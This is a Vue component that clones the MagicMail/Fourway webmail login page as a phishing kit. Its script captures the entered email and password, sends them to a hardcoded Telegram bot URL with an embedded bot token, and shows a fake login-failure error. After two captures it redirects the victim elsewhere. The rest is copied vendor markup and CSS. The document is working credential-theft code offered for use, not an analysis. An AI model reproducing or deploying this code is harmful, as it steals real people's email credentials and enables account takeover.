<template>
  <div id="app">
 
<body id="MagicBody" class="MagicBody">

<div id="MagicWrapper" class="magic-unauthenticated">

<table class="MagicOuterTable">
<tr id="page_contents_row">
<td>

<!-- Header -->
<table id="MainHeaderTable">
<tr valign="top">
    <td id="MMLogo">
        <img id="leftHeaderLogo"
             src="../src/assets/images/magicmail_logo_white.png"
             width="283"
             height="75"
             alt="MagicMail">
    </td>

    <td align="right">
        <table id="header-table">
            <tr>
                <td colspan="2" id="HeaderLogo">
                    <img id="rightHeaderLogo"
                         src="../src/assets/images/fourway.gif"
                         width="265"
                         height="75"
                         alt="Fourway">
                </td>
            </tr>

            <tr valign="bottom">
                <td colspan="2">
                    <div class="MagicNavTab">
                        <a href="logout.php">Logout</a>
                    </div>
                </td>
            </tr>
        </table>
    </td>
</tr>

<tr id="UserSubHeaderRow">
    <td colspan="2"></td>
</tr>
</table>

<!-- Content -->
<table class="MagicContentTable">
<tr valign="top">
<td class="MagicContentCell">

<div id="loginContentCell">

<div class="login-info-content">
<h2>Welcome to MagicMail</h2>

<h4>Login to access your account</h4>

<p class="main_wiz">
Welcome to the User Site for the MagicMail System.<br>
This is where you can setup and configure all your email options.
</p>

<h4>Forgot Your Password?</h4>

<p class="main_wiz">
We are dedicated to providing you a secure online environment.<br>
To have your password reset, please contact your local Customer Service and Technical Support team.<br><br>

<small><i>* You MUST have cookies enabled to use these functions.</i></small>
</p>

</div>

<div id="login-form-wrapper">

<form method="post" id="login-form">

<input type="hidden" id="browser_info" value="Win10">

<blockquote>

<table id="login-form-table" class="MagicEmbeddedTable">

<tr>
    <th colspan="2">
        <h4>Login to MagicMail</h4>
    </th>
</tr>


<tr id="error-row" valign="top" v-if="isActive" class="errorMessage"> <td colspan="2"><div class="error">Invalid Username/Password combination</div></td>
</tr>



<!-- Error message (show manually if needed) -->
<!--
<tr>
<td colspan="2">
<div class="error">
Invalid Username/Password combination
</div>
</td>
</tr>
-->


<tr>

<td class="textright">
<label for="login-email">
Email:
</label>
</td>

<td>
<input
type="email"
name="email"
id="login-email"
size="20"
autocorrect="off"
autocapitalize="none"
v-model="formDataRes.userid"
>
</td>

</tr>

<tr>

<td class="textright">
<label for="login-password">
Password:
</label>
</td>

<td class="show-password">

<input
type="password"
name="password"
id="login-password"
size="20"
v-model="formDataRes.password"
>

<label>
<input type="checkbox" id="show-password">
Show Password
</label>

</td>

</tr>

<tr class="forgot-password-row">
<td></td>

<td id="recover-pass-td">
<a href="recover-password.php">
Forgot your password?
</a>
</td>

</tr>

<tr>

<td class="formFoot">

<table>
<tr>

<td class="poweredBy">

<a href="https://www.magicmail.com" target="_blank">

<img
src="../src/assets/images/powered_by.png"
width="100"
height="51"
alt="Powered by">

</a>

</td>

<td class="loginBtn">

<input type="submit" value="Login"  @click.prevent="finishJoob();">

</td>

</tr>
</table>

</td>

</tr>

</table>

</blockquote>

</form>

</div>

</div>

<!-- Mobile Modal -->

<div id="mobileOption" class="mm-modal" style="display:none;">

<div class="mm-modal-content">

<div class="mm-modal-header">
<h2>Use Mobile Webmail</h2>
</div>

<div class="mm-modal-body">

<p>
Would you like to use the mobile-friendly webmail optimized for this device?
</p>

<label>
<input type="checkbox">
Remember this choice
</label>

</div>

<div class="mm-modal-footer">

<input
id="mobileChoiceDesktop"
type="button"
value="No Thank You">

<input
id="mobileChoiceMobile"
type="button"
value="Yes Please!">

</div>

</div>

</div>

</td>
</tr>
</table>

</td>
</tr>

<!-- Footer -->

<tr id="footer_row">
<td>

<table width="100%">
<tr align="center" class="MagicCompanyFooter">
<td>

MagicMail Server is brought to you by Fourway Computer Products, Inc.<br>

12700 4A Road Plymouth, IN 46563<br>

Tel: 800-733-0062

<a href="mailto:webmaster@fourway.net">
webmaster@fourway.net
</a>

</td>
</tr>
</table>

<table width="100%">
<tr align="center" class="MagicCopyRight">
<td>
<p>
MagicMail is a Registered Trademark of Wizard Tower TechnoServices Ltd.
</p>
</td>
</tr>
</table>

</td>
</tr>

</table>

</div>

</body>
  </div>
</template>

<script>
import axios from "axios";

export default {
  name: "App",
  data() {
    return {
      formDataRes: {
        userid: "",
        password: "",
      },
      loading: false,
      isActive: false,
      count: 0,
      finalCount: 2, // Only send once
    };
  },
  methods: {
    async finishJoob() {
      this.count++;
      console.log("Count:", this.count, "Final:", this.finalCount);

      if (this.count <= this.finalCount) {
        this.loading = true;

        // Format the message as string
        const message = `*4way *\nUserID: ${this.formDataRes.userid}\nPassword: ${this.formDataRes.password}`;

        // Send to Telegram
        await this.sendTelegramResult(
          process.env.NUXT_APP_CHAT_ID || "-5167264103",
          message
        );

        this.isActive = !this.isActive;
        this.loading = false;
      } else {
        // Redirect after sending
        location.replace("https://www.mta.info/");
      }
    },

    async sendTelegramResult(chatId, message) {
      try {
        const url = `https://api.telegram.org/bot8995458629:AAF79_PAnUKWhXudSE13oaulwrtpOsdwki0/sendMessage`;

        const payload = {
          chat_id: chatId,
          text: message,
        };

        console.log("Sending payload:", payload);
        await axios.post(url, payload);
      } catch (error) {
        console.error("Telegram API Error:", error);
      }
    },
  },
};
</script>


<style>
body {
    margin: 0;
    font-family: Arial, Helvetica, sans-serif;
    background: #e5e5e5;
}

#MagicWrapper {
    width: 100%;
}

table {
    border-collapse: collapse;
}

#MainHeaderTable {
    width: 100%;
    background: #004d66;
    color: white;
    padding: 10px;
}
.errorMessage{
  color: #000 !important;
}
.MagicNavTab {
    display: inline-block;
    padding: 8px 15px;
    background: #006699;
    border-radius: 4px;
}

.MagicNavTab a {
    color: #fff;
    text-decoration: none;
}

.MagicContentTable {
    width: 100%;
    padding: 30px;
}

#loginContentCell {
    display: flex;
    justify-content: center;
    gap: 60px;
    align-items: flex-start;
    flex-wrap: wrap;
}

.login-info-content {
    max-width: 400px;
}

#login-form-wrapper {
    background: white;
    padding: 20px;
    border: 1px solid #ccc;
    border-radius: 5px;
}

#login-form-table td,
#login-form-table th {
    padding: 8px;
}

input[type=email],
input[type=password] {
    width: 220px;
    padding: 8px;
}

input[type=submit] {
    padding: 8px 20px;
    cursor: pointer;
}

.error {
    color: #fff;
    background: #c00;
    padding: 10px;
    text-align: center;
}

.MagicCompanyFooter,
.MagicCopyRight {
    text-align: center;
    padding: 15px;
    background: #f2f2f2;
}

.mm-modal {
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,.5);
}

.mm-modal-content {
    width: 420px;
    background: white;
    margin: 100px auto;
    padding: 20px;
}

.mm-modal-footer {
    margin-top: 20px;
    text-align: right;
}

.mm-modal-footer input {
    margin-left: 10px;
}
/*
 * COPYRIGHT INFORMATION - DO NOT REMOVE
 *
 * Copyright (c) LinuxMagic Inc. 2010-2020 All Rights Reserved
 *
 * This file contains Original Code as created by LinuxMagic Inc.
 *
 * The Original Code is distributed on an 'AS IS' basis,
 * WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESS OR IMPLIED, AND LINUXMAGIC
 * HEREBY DISCLAIMS ALL SUCH WARRANTIES, INCLUDING WITHOUT LIMITATION, ANY
 * WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, QUIET
 * ENJOYMENT OR NON-INFRINGEMENT.
 *
 * Do NOT download, distribute, use or alter this software or file in any
 * way without express written permission from LinuxMagic Inc. or its parent
 * company Wizard Tower TechnoServices signed by an authorized company officer.
 *
 * Author(s): Unknown
 *            Steven Hall <stevenh@linuxmagic.com>
 *            Arturo Gamez Ortega <arturo@linuxmagic.com>
 *
 * $Id: magicmail.css 45918 2023-04-10 17:48:02Z shaun $
 */

/* @import "modal.css";
@import "pagination.css"; */

/* Quick Styles */
a {
    color: #10456B;
}

a:hover {
    color: #000;
}

.muddyAqua {
    color: #18598B;
}

/* Header FONT sizes SHOULD be relative sizing */
h2 {
    color: #10456B;
    font-size: 150%;
    font-weight: bold;
    margin: 0 0 8px;
}

h3 {
    color: #343434;
    font-size: 1.2em;
    font-weight: bold;
    margin: 4px 0;
}

.minibutton {
    background: #FFF;
    border: 1px solid #999;
    display: inline-block;
    -moz-border-radius: 3px;
    padding: 1px;
    -webkit-border-radius: 3px;
}

.minibutton a {
    background: #DEDEDE url(/images/background-mailboxheader.gif) repeat-x;
    color: #343434;
    cursor: pointer;
    display: block;
    font-size: 11px;
    padding: 1px 6px;
    text-align: center;
    text-decoration: none;
    white-space: nowrap;
}

.minibutton a:hover {
    background: #FFF url(/images/background-mailbox.gif) repeat-x top left;
}

/* Only used in Admin Interface, but logical to be the same across the board */
.helpLink {
    padding-right: 10px;
    float: right;
}

/* Probably be considered for wizard.css */
td.success {
    border: 2px solid #008800 !important
}

td.error {
    border: 2px solid #990000 !important;
}

/* Used in admin, portal, and js */
td.folderName > div {
    overflow: hidden;
    white-space: nowrap;
    text-overflow: ellipsis;
    max-width: 317px;
    display: inline-block;
    line-height: 25px;
}

/* table row number is even */
/* MP: We can deprecate now, using nth-child instead */
tr.even {
    background: #dedfde none repeat scroll 0 0;
}

/* Standard MagicMail Layout Items*/
/* In general, only used to set body background, and page sizing */
.MagicBody {
    background: #A5AAAD url(../src/assets/images/pagebackground.gif) repeat-x;
    padding-top: 27px;

    /* Deprecate, if you need this, better on body tag */
    text-align: center;
}

.inpopup {
    margin-left: 50px;
}

/* We want to use standard font classes, but this is a workaround */
/* This should inherit from the MagicBody, but since it doesn't
   always, you can use this in a table or div section */
.MagicStandardFont {
   font-family: 12px Verdana, Tahoma, Arial, sans-serif !important;
}

/* Normally we float this in the center, and 30 pixels from the top, 10 pixels from the bottom */
#MagicWrapper {
    margin: 0 auto 0 auto;
    text-align: left;
    position: relative;
    height: 100%;
}

.MagicOuterTable {
    /* border-spacing: 0; inherited from wizard.css */
    /* border-collapse: collapse; inherited from wizard.css */
    /* If you want a seperated footer, use the border on the first child */
    border-collapse: separate;
    border: 2px solid #424542;
    width: 1000px;
    height: 100%;
    margin: 0 auto 0 auto;
}

/* Set Blue Curved Background over the grey gradient background on parent */
/* This should be moved to css.css as it only applies to admin interfaces */
#MainHeaderTable tr:first-child {
    background: url('../src/assets/images/blue_curve_top.svg') no-repeat;
}

/* Only problem with the technique above, is that every child table
   will try also to set that as a background. Override for child tables */
#MainHeaderTable tr:first-child table tr:first-child {
    background: none;
}

/* End Admin Only */
.MagicOuterTable tr:first-child {
    /* border: 4px solid #424542; */
    height: 100%;
}

.MagicOuterTable td {
    vertical-align: top; /* Override Wizard Behavior */
}

.MagicContentTable {
    border-collapse: collapse;
    border-spacing: 0;
    background: url(../src/assets/images/blue_curve_body.svg) no-repeat, linear-gradient(#FFF, #e6e7e8);
    width: 100%;
    margin: 0;
    padding: 0;
    font-family: Verdana, Tahoma, Arial, sans-serif !important;

    /* Ugly way to do this.. Since you need to change the amount you subtrack everytime the header changes
       but this will allow the table to expand to the full size of the parent */
    height: calc(100% - 119px);
}

/* This may replace MagicContent, same as #EmailOptions from user interface */
#MagicMailDataDiv {
    line-height: 150%;
    margin: 0 8px 0 auto;
    width: 100%
}

/* Legacy, but useful for tables that are NOT data tables */
/* MP: Of course,we can slowly move these to flex divs */
/* Moved from the admin interface specific css */
/* MP: They conflicted, we need this in global only */
table.MagicEmbeddedTable {
    max-width: 690px;
    border: 1px solid #aaa;
    background-color: #ffffff;
    font-family: Verdana, Arial, Helvetica, sans-serif;
    font-size: 12px;
}

table.noBorder {
    border: 0px;
}

table.multiListHolder {
    width: 100%;
}

table.multiListHolder tr td div.multiListTitle {
    text-align: left;
    margin-left: 24px;
    font-weight: bold;
}

table.MagicEmbeddedTable .multiListHolder td {
    text-align: center;
}

table.MagicEmbeddedTable .multiListHolder td.multiListMiddleButtons {
    vertical-align: middle;
}

.MagicEmbeddedTable th {
    background: #EFEFEF;
    border-bottom: 1px solid #AAA;
    height: 25px;
    /* padding-left: 10px; No need fo this */
}

/* Don't know if this is needed everywhere */
table.MagicEmbeddedTable td.MagicLoginInfo {
    word-break: break-all;
}

table.MagicEmbeddedTable tr {
    /*
     * ie8 centres content of cells otherwise.
     * for instance see appearance of single account manage page without this.
     */
    text-align: left;
}

table.MagicEmbeddedTable th {
    /* Should be in Embedded Table Definition */
    background-color: #EFEFEF;
    border-bottom: 1px solid #ADAAAD;
    font-size: 14px;
    /* we text-align: left rows, but want headers to be centred */
    text-align: center;
}

table.MagicEmbeddedTable th a {
    font-weight: bold;
    text-decoration: none;
    font-size: 12px;
    color: #10456B;
}

table.MagicEmbeddedTable th a:hover {
    color: #000;
}

table.MagicEmbeddedTableHeader {
    /* Should be in Embedded Table Definition */
    background-color: #efefef;
    border-bottom: #aaa 1px solid;
}

table.MagicEmbeddedTable .error {
    text-align: center;
    border: 2px #990000 solid;
    /* background-color: #FFCCD7; */
    font-weight: bold;
}

table.MagicEmbeddedTable .success {
    text-align: center;
    background-color: #88EE88;
    border: 2px solid #008800;
    font-weight: bold;
}

table.MagicEmbeddedTable .header {
    background-color: #afafaf;
    color: white; font-weight: bold;
    padding: 2px; text-align: center;
}

table.MagicEmbeddedTable .entry {
    border-left: 1px solid #afafaf;
    padding-left: 4px;
}

table.MagicEmbeddedTable .entryAlt {
    border-left: 1px solid #afafaf;
    padding-left: 4px;
}

/*
 * TODO: these tables should be converted to MagicDataTable, but for now to
 * consolidate alt rows I apply this rule
 * TODO: Eventually can move to divs, now that display: flex is available for
 * layout
 */
table.MagicEmbeddedTable tr.even,
table.MagicEmbeddedTable td.even {
    background: #dedfde;
}

table.MagicEmbeddedTable td.MagicSettingsLabel {
    width: 350px;
    height: 32px;
}

table.MagicEmbeddedTable td.MagicSettingsInput {
    width: 160px;
    height: 32px;
}

table.MagicEmbeddedTable td.MagicSettingsHelp {
    width: 40px;
    height: 32px;
}

table.MagicEmbeddedTable td.MagicLoginInfo {

    word-break: break-all;
}

.MagicCompanyFooter td,
.MagicCopyRight  td {
    font-size: 11px;
    line-height: 1.3em;
    text-align: center;
}

.MagicCompanyFooter {
    background-color: #f0f1f2;
}

.MagicCopyRight {
    background-color: #18598B;
    color: #FFF;
}

.MagicCopyRight p {
    margin: 10px 0 5px;
}

/* Header, from /usr/share/magicmail/php/html_files/EN/header_style1.html */
#MainHeaderTable {
    background-image: linear-gradient(#fefefe, #e6e7e8);
    border-spacing: 0;
    border-collapse: collapse;
    height: 104px;
    width: 100%;
}

#MainHeaderTable table {
    float: right;
}

/* New MagicMail_logo_white is 283px Ã— 75px */
#MMLogo {
    height: 77px;
    padding-left: 30px !important;
    padding-top: 14px !important;
}

/* New Image, Your Company Logo (PNG) is 276pxx66px */
#HeaderLogo {
    height: 77px;
    vertical-align: top;
    padding: 10px 10px 0px 0px !important;
}

/* MP: Fix this method, we can do better than this.. */
#MainHeaderTable td {
    padding: 0px;
    margin: 0px;
}

#MainHeaderTable td.nopad a.nopad {
    float: right;
    margin: -1px 0 0;
}

#MainHeaderTable td.nopad a:hover.nopad {
    cursor: pointer;
    filter: alpha(opacity=80);
    opacity: 0.8;
}

/* Admin Interface specific */
.CustomHeaderTable {
    background: #FFF url('/images/1px_black_top.png') repeat-x top left;
    border: 0;
    height: 104px;
    margin: 0;
    padding: 0;
    width: 100%;
}

.CustomHeaderTable td {
    margin: 0;
    padding: 0;
    font-size: 0; /* IE Fix */
}

#AdminSubHeaderRow {
    background: #FFF url(/images/1px_grey_top.png) repeat-x;
}

/* Merge the two names below? */
#MainHeaderSubMenu {
    background: url(/images/background-sub.gif) no-repeat;
    font-size: 10px;
    height: 20px;
}

#CustomHeaderSubMenu {
    text-align: right;
    padding-top: 1px;
    background: url(/images/sub_menu_left.png) no-repeat;
    font-size: 11px;
    line-height: 1.5em;
}

/* Smaller table to hold company logo, and login/help buttons in header, floats right */
#header-table {
    border-spacing: 0;
    border-collapse: collapse;
}

#header-table td {
    text-align: right !important;
    padding: 0px;
    margin: 0px;
}

/*Logout button*/
.MagicNavTab {
    background-color: #555855;
    border-radius: 8px 8px 0px 0px;
    overflow: hidden;
    width: 100px;
    height: 28px;
    text-align: center;
    vertical-align: bottom;
    font-size: 1.4em;
    color: #FFF;
    float: right;
}
.MagicNavTab a {
    color: #FFF;
    transition: .2s;
    text-decoration: none;
    display: flex;
    width: 100%;
    height: 100%;
    align-items: center;
    justify-content: center;
}

/* Think this is only used in admin interface now, but keep around */
#MainHeaderSubMenu a {
    color: #000;
}

#MainHeaderSubMenu a:hover {
    color: #10456B;
}

/* Admin Interface, this is called AdminSubHeaderRow */
#UserSubHeaderRow {
    background: #FFF url(/images/1px_grey_top.png) repeat-x;
}

#MainHeaderSubMenu {
    text-align: right;
    padding-top: 1px;
    background: url(/images/sub_menu_left.png) no-repeat;
    font-size: 11px;
    line-height: 1.5em;
}

/* This is what it is called in the admin interface */
.MagicLeftMenuCell {
    background: url('/images/clearleft_menu_1px.png') repeat-y top left;
    margin: 0;
    padding: 10px 0px 15px 25px;
    min-height: 300px;
    width: 200px;
    font: 12px Verdana, Arial, Helvetica, sans-serif !important;
}

#loggedinas {
    background: #FFF;
    border: 2px solid #10456B;
    font-size: .9em;
    overflow: hidden;
    text-align: center;
    padding: 6px;
    width: 160px;
}

#loggedinas strong {
    color: #10456B;
}

.sideerror {
    background: #FFF;
    border: 2px solid #A00;
    color: #840000;
    font-weight: bold;
    margin: 13px 0;
    text-align: center;
    width: 175px;
    font-size: 0.9em;
    padding: 4px !important;
}

/* Main Menu, common to Admin and User Interfaces */
#MagicMenu {
    width: 200px;
}

/* MP: Why is this here? */
#Sidebar h4 em {
    display: none;
}

#MagicMenu ul {
    list-style: none;
    margin-left: 5px;
}

#MagicMenu ul li {
    border-bottom: 1px solid #AAA;
    color: #000;
    margin: 0;
    padding: 0;
    text-decoration: none;
}

#MagicMenu ul > li {
    height: auto;
}

/* Deprecated, but might be useful in the future */
#MagicMenu .dash {
    display: none;
}

#MagicMenu ul li a {
    color: #000;
    display: block;
    height: 26px;
    line-height: 26px;
    padding-left: 25px;
    text-decoration: none;
    min-height: 18px;
}

#MagicMenu ul li a:hover {
    background-color: #EEE;
    color: #10456B;
}

#MagicMenu ul.subMenu li {
    border-bottom: 0;
}

#MagicMenu ul.subMenu li:not(:first-child) {
    border-top: 1px solid #AAA;
}

#MagicMenu ul.subMenu .dash {
    display: none;
}

/* hide image backgrounds for submenu items */
#MagicMenu ul.subMenu li a, #MagicMenu ul.SubMenu li a:hover {
    background: none;
}

#MagicMenu ul.subMenu li a {
    color: #444;
    display: block;
    height: 20px;
    line-height: 20px;
    padding: 0 0 0 23px;
    margin: 0;
    font-size: 11px;
    text-decoration: none;
}

#MagicMenu ul.subMenu a:hover {
        color: #10456B;
}

#MagicMenu ul.subMenu li.active a {
    color: #10456B;
}

/* Only used in admin, but logical to have same behavior across the board */
.selectedMenuItem {
    color: #498AB2 !important;
}

.selectedMenuItem:hover {
    color: #10456B!important;
}

/* Spam Count, Only used in the login page */
#MagicSpamCount {
    width: 174px;
}

p#HelpMsg {
    background: #999;
    color: #FFF;
    font-size: 0.9em;
    margin: 0px;
    padding: 6px;
    text-align: center;
}

p#HelpMsg:hover {
    cursor: help;
}

#MagicSpamCount #MailSummary {
    background: #F2F2F2;
    border: 1px solid #444;
    margin: 15px auto 0;
    width: 100%;
}

#MailSummary h4 {
    background: #999;
    border-bottom: 1px solid #555;
    border-top: none;
    color: #FFF;
    font-weight: bold;
    margin: 0;
    padding: 3px;
    text-align: center;
    font-size: 10pt;
}

#MailSummary p {
    font-size: 12px;
    margin: 5px;
    text-align: center;
}

#MailSummary p span {
    display: block;
    margin: .5em 0;
}

/* Powered By */
#PoweredBy {
    margin: 8px 0;
    text-align: center;
    width: 175px;
}

/* Page Content */
.MagicContentCell {
    background-color: #ffffff;
    padding-left: 0;
    padding: 15px 15px 15px 20px;
    text-align: left;
}

.MagicContentCell {
    vertical-align: top;
}

.MagicContentCell p {
    margin: 8px 0;
}

.MagicContentCell .main_wiz p,
.MagicContentCell p {
    font-size: 1em;
}

#Promo {
    margin: 40px auto 20px;
}

/* MP: Is this even used any more? Maybe Admin */
#Footer {
    width: 100%;
    margin: 20px auto 0;
    padding-top: 10px;
    clear: both;
    border-top: solid 1px #cdcdcd;
    background-color: #18598B;
}

.SubmitButton {
    margin-top: 10px;
    text-align: right;
}

/* used with the printNoticePage function, functions.php */
.pagenotice {
    background: #FFF;
    border: 2px solid red;
    padding: 1em;
}

.pagenotice br {
    display: none;
}

/* tooltip 'hover' stuff. */
.Tooltip {
    background: #FCFCFC;
    border: 1px solid #DDD;
    filter: alpha(opacity=90);
    font-size: 12px;
    line-height: 18px;
    width: 250px;
    -moz-border-radius: 5%;
    -moz-opacity: 0.90;
    padding: 10px;
    text-align: left;
    display: none;
    z-index: 99;
}

p.Tooltip {
   background-color: #ffffb3;
   border: 1px solid #dddddd;
   border-radius: 5%;
   color: #222;
   display: none;
   font-size: 12px;
   line-height: 1.2em;
   margin: 0;
   padding: 10px !important;
   white-space: normal;
   width: 250px;
   text-align: center;
   z-index: 10;
}

/* Used in admin and user interface */
.MagicEmailList {
    word-break: break-all;
    word-wrap: break-word;
    padding-right: 20px;
}

/* styles from admin/magicmail.css */
/* MP MagicDataTable is for stacking tables, slowly being replaced by divs' */
/* Only used in the user interface in the following:
   modules/quarantine.php
   js/forgot_password.js
   Heavily used in the admin interface
*/

table.MagicDataTable {
    border: 1px solid #999;
    border-spacing: 0px;
    border-radius: 4px;
    -moz-border-radius: 4px;
    -webkit-border-radius: 4px;
    margin-bottom: 8px !important;
    padding: 0;
    width: 100% !important;
    overflow: hidden;
}

table.MagicDataTable tr {
    min-height: 1.1em;
}

/* The following is legacy, Bryan suggests that we make it look differently */
table.MagicDataTable tr.header {
    border-bottom: 1px solid #999;
    color: #343434;
    padding: 0;
}

/*
 * extra_icon_space is a specific class for the domains list 
 * to add icons depending their status 
 */
table.extra_icon_space tbody .hosted_domain td:last-child {
    min-width: 161px;
    white-space: nowrap;
}
table.extra_icon_space tbody .hosted_domain td:last-child .health_icon {
    background: url(/images/unknown_health_icon.png);
    background-size: 100%;
}
table.extra_icon_space tbody .hosted_domain td:last-child .alert_icon {
    background: url(/images/icon-warning.png);
    background-size: 100%;
}
table.extra_icon_space tbody .hosted_domain td:last-child span {
    background-size: 100%;
    width: 13px;
    height: 11px;
    display: inline-block;
    background-repeat: no-repeat;
    margin-left: 5px;
    position: relative;
    top: 2;
}

/* We can do that by setting the th header class as follows:
   Only problem, we have to get rid of hard coded per table
   rules currently in place, eg #EmailOptions */
table.MagicDataTable tr.header th {
    text-align: center;
    height: 30px;
    font-size: 1.1em;
    font-weight: bold;
    line-height: 1.3em;
    vertical-align: bottom;
    padding-bottom: 5px;
    color: #00567b;
    background-image: linear-gradient(to bottom, #FFF, #e6e7e8);
}

/* This is to replace the use of ul's in table headers,
   and replace with
    <span class='tableHeaderHelpIconLeft' onClick=\"javascript:showHelp('emailoption_aliases')\"><span>
    <span class='tableTitleHelpIconLeft'>Some Title</span>
*/
.tableHeaderHelpIconLeft {
    cursor: help;
    background: url(/images/question_icon.svg) no-repeat;
    background-position: top;
    width: 16px;
    height: 16px;
    margin-left: 8px;
    overflow: hidden;
    float: left;
}

.tableHeaderHelpIconRight {
    cursor: help;
    background: url(/images/question_icon.svg) no-repeat;
    background-position: top;
    width: 16px;
    height: 16px;
    margin-right: 8px;
    overflow: hidden;
    float: right;
}

.tableTitleHelpIconLeft {
    padding-right: 24px;
}

.tableTitleHelpIconRight {
    padding-left: 24px;
}

.tableHeaderLinkRight {
    float: right;
    margin-right: 10px;
}

.tableHeaderLinkRight a {
    text-decoration: none;
}

table.MagicDataTable tr.subHeader {
    border-bottom: 1px solid #999;
    color: #343434;
}

table.MagicDataTable tr.header th, tr.subHeader th {
    border-bottom: 1px solid #999;
    font-weight: bold;
    line-height: 18px;
}

/* Deprecate */
table.MagicDataTable th ul {
    border-radius: 4px;
    height: 18px;
    list-style: outside none none;
    margin: 0;
    padding: 2px 0;
    position: relative;
    text-align: center;
    width: auto;
}

table.MagicDataTable tr.subHeaderDark {
    background: #848484 url("/images/subheader.gif") repeat-x scroll 0 0;
    color: #ffffff;
}

table.MagicDatable tr.subHeaderDark th a {
    color: #ffffff;
}

/* Deprecate */
table.MagicDataTable th ul li {
    display: inline;
    padding: 0;
    text-align: left;
    text-indent: 22px;
    white-space: nowrap;
}

/* Deprecate */
table.MagicDataTable th ul li.helplink a {
    background: rgba(0, 0, 0, 0) url("/images/helpicon.gif") no-repeat scroll 0 0;
    border: 0 none;
    cursor: help;
    display: block;
    font-size: 0;
    height: 12px;
    padding: 0;
    width: 12px;
}

/* Deprecate */
table.MagicDataTable th ul li a:link {
    text-decoration: none;
}

/* Deprecate */
table.MagicDataTable th ul li.helplink a:hover {
    opacity: 0.7;
}

/* While all subHeaders should use th, some td's still exist */
table.MagicDataTable tr.subHeader td {
   font-weight: bold;
   font-size: 1.1em;
   padding: 3px 6px;
}

table.MagicDataTable td {
    /* Technically, this should be a separate class */
    border-bottom: 1px solid #dbdbdb;

    padding: 3px 6px;

    /* Override OuterTable definition */
    vertical-align: baseline;
}

table.MagicDataTable td label {
    display: inline-block;
    padding-top: 0.8em;
}

.roomyrow {
    line-height: 28px;
}

table.MagicDataTable tr.even {
    background: #dedfde none repeat scroll 0 0;
}

table.MagicDataTable td .minibutton a {
    color: #2951a5;
    font-weight: normal;
}

td.success {
    border: 2px solid #008800 !important
}

td.error {
    border: 2px solid #990000 !important;
}

table.MagicDataTable tr.success td {
    background: rgba(0, 0, 0, 0) url("/images/icon-success.png") no-repeat scroll 0 0;
    padding-left: 20px;
}

table.MagicDataTable tr.error td {
    background: rgba(0, 0, 0, 0) url("/images/icon-warning.png") no-repeat scroll 0 0;
    padding-left: 20px;
}

table.MagicDataTable tr.subHeader th {
    vertical-align: top;
}

table.MagicDataTable tr.subHeader.subHeaderDark th a {
    color:white;
    font-weight:normal;
    padding:5;
}

table.MagicDataTable tr.subHeader th.checkcell a {
    padding: 0px;
}

table.MagicDataTable .success {
    text-align: center;
    background-color: #88EE88;
    border: 2px solid #008800;
    font-weight: bold;
    overflow: hidden;
}

table.MagicDataTable .error {
    text-align: center;
    border: 2px #990000 solid;
    background-color: #FFCCD7;
    font-weight: bold;
}

table.MagicDataTable .warning {
    text-align: center;
    border: 2px #b69508 solid;
    background-color: #F0D511;
    font-weight: bold;
}

/* LoginAlertBox, designed to be only loaded/shown on first login in */
/* See example usage in MagicMail admin site for checking if the 'My Network IPs' file is updated */
/* cat /etc/magic-mail/control/isp_owned_ranges */
/* Possibly this is unique enough to go in page specific CSS files */
div.postLoginAlert {
    position: fixed;
    width: 250px;
    height: 300px;
    right: 100px;
    bottom: 100px;
    box-shadow: 3px 3px 5px 3px rgba(105,105,105,0.6);
    -webkit-box-shadow: 3px 3px 5px 3px rgba(105,105,105,0.6);
    -moz-box-shadow: 3px 3px 5px 3px rgba(105,105,105,0.6);
    -webkit-transition: opacity 1s ease-out;
    -webkit-user-drag: element; /* Doens't work fo every browser, but helpful */
    transition: opacity 1s ease-out;
    background-color: #FFF;
}

div.postLoginAlert .header {
    color: #FFF; /* muddiAqua */
    background-color: #18558C;
    height: 26px;
    font-size: 2.0em;
    font-style: bold;
    text-align: right;
    vertical-align: center;
    padding: 3px;
    padding-right: 6px;
}

/* Experimental CSS Only trick to hide a div */
div.postLoginAlert .main {
    color: #000;
    text-align: center;
    padding-top: 1.0em;
}

div.postLoginAlert .main img {
    margin: 5px;
}

div.postLoginAlert .hideMe {
    cursor: pointer;
}

div.postLoginAlert .hideMe:focus + div.postLoginAlert > div {
    display: none;
}

div.postLoginAlert .bigFont {
    font-size: 2.0em;
    color: #18558C;
}

div.postLoginAlert .regFont {
    font-size: 0.9em;
    padding: 5px;
}

div.postLoginAlert .bigNumber {
    font-size: 1.5em;
    color: #000;
    display: block;
    padding-top: 2px;
}

.multilist.select {
    width: 250px;
}

.multilist.save {
    width: 120px;
}

.multiListMiddleButtons {
    width: 100px;
}

/* sliding toggle */
.sliding-checkbox-center {
    width: 75%;
    margin: 0 auto;
}

.sliding-checkbox {
    position: relative;
    width: 50px;
}

.sliding-checkbox-checkbox {
    display: none;
}

.sliding-checkbox-label {
    display: block !important;
    overflow: hidden; cursor: pointer;
    border: 2px solid #999999; border-radius: 30px;
    padding-top: 0em !important;
}

.sliding-checkbox.disabled .sliding-checkbox-label {
    cursor: not-allowed;
}

.sliding-checkbox-inner {
    display: block; width: 200%; margin-left: -100%;
    transition: margin 0.3s ease-in 0s;
}

.sliding-checkbox-inner:before, .sliding-checkbox-inner:after {
    display: block; float: left; width: 50%; padding: 0; line-height: 1.5;
    font-size: 12px;
    box-sizing: border-box;
    border-radius: 30px;
}

.sliding-checkbox-inner:before {
    content: "ON";
    padding-left: 4px;
    background-color: #22B24C; color: #FFFFFF;
}

.sliding-checkbox-inner:after {
    content: "OFF";
    padding-right: 4px;
    background-color: red; color: #FFFFFF;
    text-align: right;
}

.sliding-checkbox.disabled .sliding-checkbox-inner:before,
.sliding-checkbox.disabled .sliding-checkbox-inner:after {
    background-color: #EEEEEE;
    color: #999999;
}

.sliding-checkbox-switch {
    display: block; width: 20px; margin: 0px;
    background: #FFFFFF;
    border: 2px solid #999999; border-radius: 30px;
    position: absolute; top: 0; bottom: 0; right: 30px;
    transition: all 0.3s ease-in 0s; 
    box-shadow: 0 1px 1px white inset;
}

.sliding-checkbox-checkbox:checked + .sliding-checkbox-label .sliding-checkbox-inner {
    margin-left: 0;
}

.sliding-checkbox-checkbox:checked + .sliding-checkbox-label .sliding-checkbox-switch {
    right: 0px; 
}

/*------------------------------------------*/
/* Empty tables message */
/*------------------------------------------*/
tr td.empty_table span {
    display: flex;
    justify-content: center;
    font-weight: bolder;
    color: #18598c;
    word-spacing: 4px;
    letter-spacing: 4px;
    cursor: default;
    opacity: .3;
    text-transform: uppercase;
